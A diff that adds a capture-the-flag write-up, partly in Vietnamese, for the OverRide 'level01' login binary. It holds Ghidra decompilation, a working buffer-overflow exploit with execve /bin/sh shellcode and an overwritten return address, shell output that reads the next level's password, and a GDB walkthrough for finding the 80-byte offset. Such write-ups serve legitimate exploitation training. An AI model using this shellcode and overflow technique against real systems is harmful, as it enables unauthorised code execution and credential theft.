@@ -1,0 +1,211 @@
+RELRO             STACK CANARY          NX               PIE             RPATH        RUNPATH         FILE
+Partial RELRO 🟡   No canary found 🔴   NX disabled 🔴    No PIE 🔴       No RPATH 🟢   No RUNPATH 🟢   /home/users/level01/level01
+
+----------
+level01@OverRide:~$ ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: hello
+verifying username....
+
+nope, incorrect username...
+
+----------- ghidra ----------
+
+int verify_user_name(void)
+
+{
+  int iVar1;
+  byte *pbVar2;
+  byte *pbVar3;
+  undefined1 uVar4;
+  undefined1 uVar5;
+  byte bVar6;
+  
+  bVar6 = 0;
+  uVar4 = &stack0xfffffff4 < (undefined1 *)0x10;
+  uVar5 = &stack0x00000000 == (undefined1 *)0x1c;
+  puts("verifying username....\n");
+  iVar1 = 7;
+  pbVar2 = &a_user_name;
+  pbVar3 = (byte *)"dat_wil";
+  do {
+    if (iVar1 == 0) break;
+    iVar1 = iVar1 + -1;
+    uVar4 = *pbVar2 < *pbVar3;
+    uVar5 = *pbVar2 == *pbVar3;
+    pbVar2 = pbVar2 + (uint)bVar6 * -2 + 1;
+    pbVar3 = pbVar3 + (uint)bVar6 * -2 + 1;
+  } while ((bool)uVar5);
+  return (int)(char)((!(bool)uVar4 && !(bool)uVar5) - uVar4);
+}
+
+
+
+int verify_user_pass(byte *param_1)
+
+{
+  int iVar1;
+  byte *pbVar2;
+  undefined1 in_CF;
+  undefined1 in_ZF;
+  
+  iVar1 = 5;
+  pbVar2 = (byte *)"admin";
+  do {
+    if (iVar1 == 0) break;
+    iVar1 = iVar1 + -1;
+    in_CF = *param_1 < *pbVar2;
+    in_ZF = *param_1 == *pbVar2;
+    param_1 = param_1 + 1;
+    pbVar2 = pbVar2 + 1;
+  } while ((bool)in_ZF);
+  return (int)(char)((!(bool)in_CF && !(bool)in_ZF) - in_CF);
+}
+
+
+
+undefined4 main(void)
+
+{
+  undefined4 uVar1;
+  int iVar2;
+  char *pcVar3;
+  char local_54 [64];
+  int local_14;
+  
+  pcVar3 = local_54;
+  for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {
+    pcVar3[0] = '\0';
+    pcVar3[1] = '\0';
+    pcVar3[2] = '\0';
+    pcVar3[3] = '\0';
+    pcVar3 = pcVar3 + 4;
+  }
+  local_14 = 0;
+  puts("********* ADMIN LOGIN PROMPT *********");
+  printf("Enter Username: ");
+  fgets(&a_user_name,0x100,stdin);
+  local_14 = verify_user_name();
+  if (local_14 == 0) {
+    puts("Enter Password: ");
+    fgets(local_54,100,stdin);
+    local_14 = verify_user_pass(local_54);
+    if ((local_14 == 0) || (local_14 != 0)) {
+      puts("nope, incorrect password...\n");
+      uVar1 = 1;
+    }
+    else {
+      uVar1 = 0;
+    }
+  }
+  else {
+    puts("nope, incorrect username...\n");
+    uVar1 = 1;
+  }
+  return uVar1;
+}
+
+---------
+level01@OverRide:~$ (python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"'; python -c 'print "A"*80 + "\x47\xa0\x04\x08"'; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+whoami
+level02
+cat ../level02/.pass
+cat: ../level02/.pass: Permission denied
+pwd
+/home/users/level01
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+------ WHY 80? ------
+
+
+------- why 80? --------
+Trình biên dịch (như GCC) thường muốn dữ liệu nằm ở những địa chỉ chia hết cho 16 để CPU xử lý nhanh hơn.
+
+Bạn khai báo 64 bytes, nhưng thực tế GCC có thể dành ra 72 hoặc 76 bytes cho nó trên Stack để đảm bảo "ngăn nắp".
+
+Vì vậy: 64 (buffer) + X (padding) + 4 (EBP) = 80.
+
+Con số 80 này bao gồm cả biến, phần đệm và cái EBP cũ. Byte thứ 81 sẽ chính là byte đầu tiên của EIP.
+
+-> check with gdb vi bien nay co the thay doi 
+
+#### Cách B: Soi địa chỉ trong GDB
+Bạn có thể dùng GDB để xem địa chỉ chính xác của biến và địa chỉ của EIP:
+1.  `p &local_54` $\rightarrow$ Xem biến nằm ở đâu (Ví dụ: `0xffffd000`).
+2.  `info frame` $\rightarrow$ Xem "Saved rip" (hoặc eip) nằm ở đâu (Ví dụ: `0xffffd050`).
+3.  Lấy địa chỉ EIP trừ đi địa chỉ biến: `0xffffd050 - 0xffffd000 = 80` (decimal).
+
+---------- tim voi GDB --------
+Để tìm ra con số chính xác mà không cần "đoán già đoán non", chúng ta sẽ sử dụng **GDB (GNU Debugger)**. Đây là cách "soi" trực tiếp vào xương tủy của chương trình khi nó đang chạy.
+
+Dưới đây là quy trình 3 bước để xác định Offset (khoảng cách) từ buffer đến địa chỉ trả về (EIP).
+
+---
+
+### Bước 1: Mở GDB và đặt điểm dừng (Breakpoint)
+Chúng ta cần dừng chương trình ngay sau khi nó nhận Password nhưng **trước** khi nó kết thúc hàm `main`.
+
+```bash
+gdb ./level01
+(gdb) break *main+125  # Đặt breakpoint sau lệnh fgets nhận password
+(gdb) run
+```
+*(Lưu ý: Bạn có thể dùng `disas main` để tìm địa chỉ chính xác sau lệnh call `fgets` nếu `+125` không khớp).*
+
+---
+
+### Bước 2: Tìm địa chỉ của Buffer và EIP
+Khi chương trình dừng lại, chúng ta sẽ hỏi GDB hai địa chỉ quan trọng:
+
+1.  **Địa chỉ của biến `local_54`:**
+    ```bash
+    (gdb) p &local_54
+    ```
+    *Giả sử kết quả là: `$1 = (char (*)[64]) 0xffffd000`*
+
+2.  **Địa chỉ nơi lưu EIP (Return Address):**
+    Chúng ta dùng lệnh `info frame` để xem cấu trúc của ngăn xếp hiện tại.
+    ```bash
+    (gdb) info frame
+    ```
+    Hãy nhìn vào dòng có chữ **"saved eip"**.
+    *Giả sử nó ghi: `saved eip = 0x08048ed9 at 0xffffd050`*
+
+
+
+---
+
+### Bước 3: Làm phép tính trừ
+Bây giờ, bạn chỉ cần lấy địa chỉ nơi chứa EIP trừ đi địa chỉ bắt đầu của Buffer:
+
+*   **Địa chỉ EIP:** $0xffffd050$
+*   **Địa chỉ Buffer:** $0xffffd000$
+
+Sử dụng GDB để tính toán nhanh cho bạn (kết quả trả về hệ thập phân `/d`):
+```bash
+(gdb) p/d 0xffffd050 - 0xffffd000
+$2 = 80
+```
+
+**Kết quả:** Bạn cần chính xác **80 bytes** để chạm tới EIP. Byte thứ 81, 82, 83, 84 sẽ đè lên địa chỉ trả về đó.
+
+---
+
+### Mẹo: Nếu file bị "strip" (không có tên biến trong GDB)
+Đôi khi bài Lab sẽ xóa hết tên biến (`local_54`), GDB sẽ báo `No symbol "local_54" in current context`. Đừng lo, ta làm cách sau:
+
+1.  Gõ `disas main`.
+2.  Tìm dòng gọi `fgets`. Trước đó thường có lệnh: `lea eax, [ebp-0x50]`.
+3.  `0x50` chính là khoảng cách từ Buffer đến EBP (Base Pointer).
+4.  Vì EIP nằm ngay sau EBP (cách 4 bytes trong kiến trúc 32-bit), ta có công thức: 
+    $$\text{Offset} = 0x50 + 4 = 80 + 4 = 84 \text{ bytes (tới hết EIP)}$$
+    *(Tùy vào compiler, con số này có thể là 80 hoặc 84 tùy vào việc bạn muốn đè **lên** EIP hay đè **đến** EIP).*
+
+---
